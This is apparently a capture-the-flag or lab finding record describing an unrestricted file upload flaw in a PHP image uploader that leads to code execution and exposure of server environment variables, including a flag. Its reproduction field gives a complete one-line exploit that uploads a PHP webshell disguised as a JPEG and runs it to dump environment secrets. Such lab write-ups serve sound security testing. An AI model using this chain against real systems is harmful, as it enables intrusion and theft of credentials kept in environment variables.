findings.title: Unrestricted File Upload → RCE → Environment Variable Disclosure (FLAG)
findings.description: The image upload application at index.php performs no server-side validation of uploaded file content — only the client-supplied MIME type is checked (if at all). An attacker can upload a PHP webshell with Content-Type: image/jpeg and the server will save and execute it under /upload/. Executing the shell reveals all server environment variables including FLAG.

reproduction.command: echo '<?php print_r(getenv()); ?>' > /tmp/envshell.php && curl -X POST http://172.17.0.1:42411/index.php -F 'userfile=@/tmp/envshell.php;filename=envshell.php;type=image/jpeg' -F 'submit=Upload Image' && curl http://172.17.0.1:42411/upload/envshell.php
